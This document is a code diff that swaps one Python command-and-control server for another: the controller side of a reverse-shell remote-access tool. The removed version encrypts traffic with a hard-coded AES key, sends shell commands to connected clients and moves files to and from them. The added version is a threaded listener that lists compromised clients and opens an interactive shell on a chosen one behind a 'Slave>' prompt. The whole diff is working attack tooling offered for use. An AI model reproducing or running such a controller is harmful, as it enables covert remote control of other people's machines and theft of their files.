@@ -1,173 +1,253 @@
-#!/usr/bin/python
-
-from Crypto.Cipher import AES
 import socket
-import base64
+import threading
 import time
-import os
-import sys,select
+import sys
+from queue import Queue
+import struct
+import signal
 
-# the block size for the cipher object; must be 16 per FIPS-197
-BLOCK_SIZE = 32
+NUMBER_OF_THREADS = 2
+JOB_NUMBER = [1, 2]
+queue = Queue()
 
-PADDING = '{'
+COMMANDS = {'help':['Shows this help'],
+            'list':['Lists connected clients'],
+            'select':['Selects a client by its index. Takes index as a parameter'],
+            'quit':['Stops current connection with a client. To be used when client is selected'],
+            'shutdown':['Shuts server down'],
+           }
 
-pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+class MultiServer(object):
 
-# one-liners to encrypt/encode and decrypt/decode a string
-# encrypt with AES, encode with base64
-EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
-DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
+    def __init__(self):
+        self.host = '0.0.0.0'
+        self.port = 5678
+        self.socket = None
+        self.all_connections = []
+        self.all_addresses = []
 
-# generate a random secret key
-secret = "dz7xf9t6PaC7wN+dPv+QrxHBJ2eGuLAq"
+    def print_help(self):
+        for cmd, v in COMMANDS.items():
+            print("{0}:\t{1}".format(cmd, v[0]))
+        return
 
-# create a cipher object using the random secret
-cipher = AES.new(secret)
+    def register_signal_handler(self):
+        signal.signal(signal.SIGINT, self.quit_gracefully)
+        signal.signal(signal.SIGTERM, self.quit_gracefully)
+        return
 
-# clear function
-clear = lambda: os.system('clear')
-
-HOST = '0.0.0.0'
-PORT = 666
-
-c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-c.bind((HOST, PORT))
-c.listen(128)
-#s,a = c.accept()
-
-active = False
-clients = []
-socks = []
-interval = 0.8
-
-print '\nListening for clients...\n'
-
-
-# main loop
-while True:
-
-    # listen for clients
-    try:
-            c.settimeout(4)
+    def quit_gracefully(self, signal=None, frame=None):
+        print('\nQuitting gracefully')
+        for conn in self.all_connections:
             try:
-                s,a = c.accept()
+                conn.shutdown(2)
+                conn.close()
+            except Exception as e:
+                print('Could not close connection %s' % str(e))
+                # continue
+        self.socket.close()
+        sys.exit(0)
 
-            except socket.timeout:
+    def socket_create(self):
+        try:
+            self.socket = socket.socket()
+        except socket.error as msg:
+            print("Socket creation error: " + str(msg))
+            # TODO: Added exit
+            sys.exit(1)
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        return
+
+    def socket_bind(self):
+        """ Bind socket to port and wait for connection from client """
+        try:
+            self.socket.bind((self.host, self.port))
+            self.socket.listen(5)
+        except socket.error as e:
+            print("Socket binding error: " + str(e))
+            time.sleep(5)
+            self.socket_bind()
+        return
+
+    def accept_connections(self):
+        """ Accept connections from multiple clients and save to list """
+        for c in self.all_connections:
+            c.close()
+        self.all_connections = []
+        self.all_addresses = []
+        while 1:
+            try:
+                conn, address = self.socket.accept()
+                conn.setblocking(1)
+                client_hostname = conn.recv(1024).decode("utf-8")
+                address = address + (client_hostname,)
+            except Exception as e:
+                print('Error accepting connections: %s' % str(e))
+                # Loop indefinitely
                 continue
-            print "olla omego"
-            # add socket
-            if (a):
-                    # disable timeout
-                    s.settimeout(None)
-                    # add socket to list
-                    socks += [s]
-                    # add client to listen
-                    clients += [str(a)]
+            self.all_connections.append(conn)
+            self.all_addresses.append(address)
+            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
+        return
 
-            #display clients
-            clear()
-            print '\nListening for clients...\n'
-            if len(clients) > 0:
-                for j in range(0, len(clients)):
-                    print '[' + str((j+1)) + '] Client. ' + clients[j] + '\n'
-                print "Press Ctrl+C to interact with client"
-            time.sleep(interval)
-
-    except KeyboardInterrupt:
-            print 'hell no'
-            clear()
-            print '\nListening for clients...\n'
-            if len(clients) > 0:
-                for j in range(0, len(clients)):
-                    print '[' + str((j+1)) + '] Client: ' + clients[j] + '\n'
-                    print "---\n"
-                    print "[0] Exit \n"
-            activate = input("\nEnter option: ")
-            if activate == 0:
-                print '\nExiting...\n'
-                sys.exit()
-            activate -= 1
-            clear()
-            print '\nActivating client. ' + clients[activate] + '\n'
-            active = True
-            encrypted = EncodeAES(cipher, 'Activate')
-            socks[activate].send(encrypted)
-
-    # interact with client
-    while active:
-        # receive encrypted data
-        data = socks[activate].recv(1024)
-
-        #decrypt data
-        decrypted = DecodeAES(cipher, data)
-
-        # check for end of command
-        if decrypted.endswith("EOFEOFEOFEOFEOFX") == True:
-
-            # print command
-            print decrypted[:-16]
-
-            if decrypted.startswith("Exit") == True:
-                active = False
-                print 'Press Ctrl+C to return to listener mode...'
-
-            else:
-
-                # get next command.
-                nextcmd = raw_input("[shell]: ")
-
-                # encrypt it
-                encrypted = EncodeAES(cipher, nextcmd)
-
-                # send that shit
-                socks[activate].send(encrypted)
-
-            # download file (normal mode)
-            if nextcmd.startswith("download") == True:
-
-                # file name
-                downFile = nextcmd[9:]
-
-                # open file
-                f = open(downFile, 'wb')
-                print 'Downloading: ' + downFile
-
-                #Downloading
-                while True:
-                    l = socks[activate].recv(1024)
-                    while (l):
-                            if l.endswith("EOFEOFEOFEOFEOFX"):
-                                u = l[:-16]
-                                f.write(u)
-                                break
-                            else:
-                                f.write(l)
-                                l = socks[activate].recv(1024)
+    def start_turtle(self):
+        """ Interactive prompt for sending commands remotely """
+        while True:
+            cmd = input('Slave> ')
+            if cmd == 'list':
+                self.list_connections()
+                continue
+            elif cmd == 'ls':
+                self.list_connections()
+                continue
+            elif cmd == 'clear':
+                clear = lambda: os.system('clear')
+                continue
+            elif 'select' in cmd:
+                target, conn = self.get_target(cmd)
+                if conn is not None:
+                    self.send_target_commands(target, conn)
+            elif 'join' in cmd:
+                target, conn = self.get_target(cmd)
+                if conn is not None:
+                    self.send_target_commands(target, conn)
+            elif cmd == 'shutdown':
+                    queue.task_done()
+                    queue.task_done()
+                    print('Server shutdown')
                     break
-                f.close()
-            if nextcmd.startswith("upload") == True:
+                    # self.quit_gracefully()
+            elif cmd == 'help':
+                self.print_help()
+            elif cmd == '':
+                pass
+            else:
+                print('Command not recognized')
+        return
 
-                # file name
-                upFile = nextcmd[7:]
+    def list_connections(self):
+        """ List all connections """
+        results = ''
+        for i, conn in enumerate(self.all_connections):
+            try:
+                conn.send(str.encode(' '))
+                conn.recv(20480)
+            except:
+                del self.all_connections[i]
+                del self.all_addresses[i]
+                continue
+            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
+                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
+        print('----- Clients -----' + '\n' + results)
+        return
 
-                # open file.
-                g = open(upFile, 'rb')
-                print 'Uploading: ' + upFile
+    def get_target(self, cmd):
+        """ Select target client
+        :param cmd:
+        """
+        target = cmd.split(' ')[-1]
+        try:
+            target = int(target)
+        except:
+            print('Client index should be an integer')
+            return None, None
+        try:
+            conn = self.all_connections[target]
+        except IndexError:
+            print('Not a valid selection')
+            return None, None
+        print("You are now connected to " + str(self.all_addresses[target][2]))
+        return target, conn
 
-                # Uploading
-                while l:
-                    fileData = g.read()
-                    if not fileData: break
-                    # begin sending file.
-                    socks[activate].sendall(fileData)
-                g.close()
-                time.sleep(0.8)
+    def read_command_output(self, conn):
+        """ Read message length and unpack it into an integer
+        :param conn:
+        """
+        raw_msglen = self.recvall(conn, 4)
+        if not raw_msglen:
+            return None
+        msglen = struct.unpack('>I', raw_msglen)[0]
+        # Read the message data
+        return self.recvall(conn, msglen)
 
-                # let client know we're done
-                s.sendall('EOFEOFEOFEOFEOFX')
-                time.sleep(0.8)
+    def recvall(self, conn, n):
+        """ Helper function to recv n bytes or return None if EOF is hit
+        :param n:
+        :param conn:
+        """
+        # TODO: this can be a static method
+        data = b''
+        while len(data) < n:
+            packet = conn.recv(n - len(data))
+            if not packet:
+                return None
+            data += packet
+        return data
 
-        # else just print
-        else:
-            print decrypted
+    def send_target_commands(self, target, conn):
+        """ Connect with remote target client
+        :param conn:
+        :param target:
+        """
+        conn.send(str.encode(" "))
+        cwd_bytes = self.read_command_output(conn)
+        cwd = str(cwd_bytes, "utf-8")
+        print(cwd, end="")
+        while True:
+            try:
+                cmd = input()
+                if len(str.encode(cmd)) > 0:
+                    conn.send(str.encode(cmd))
+                    cmd_output = self.read_command_output(conn)
+                    client_response = str(cmd_output, "utf-8")
+                    print(client_response, end="")
+                if cmd == 'quit':
+                    break
+            except Exception as e:
+                print("Connection was lost %s" %str(e))
+                break
+        del self.all_connections[target]
+        del self.all_addresses[target]
+        return
+
+
+def create_workers():
+    """ Create worker threads (will die when main exits) """
+    server = MultiServer()
+    server.register_signal_handler()
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work, args=(server,))
+        t.daemon = True
+        t.start()
+    return
+
+
+def work(server):
+    """ Do the next job in the queue (thread for handling connections, another for sending commands)
+    :param server:
+    """
+    while True:
+        x = queue.get()
+        if x == 1:
+            server.socket_create()
+            server.socket_bind()
+            server.accept_connections()
+        if x == 2:
+            server.start_turtle()
+        queue.task_done()
+    return
+
+def create_jobs():
+    """ Each list item is a new job """
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+    return
+
+def main():
+    create_workers()
+    create_jobs()
+
+
+if __name__ == '__main__':
+    main()
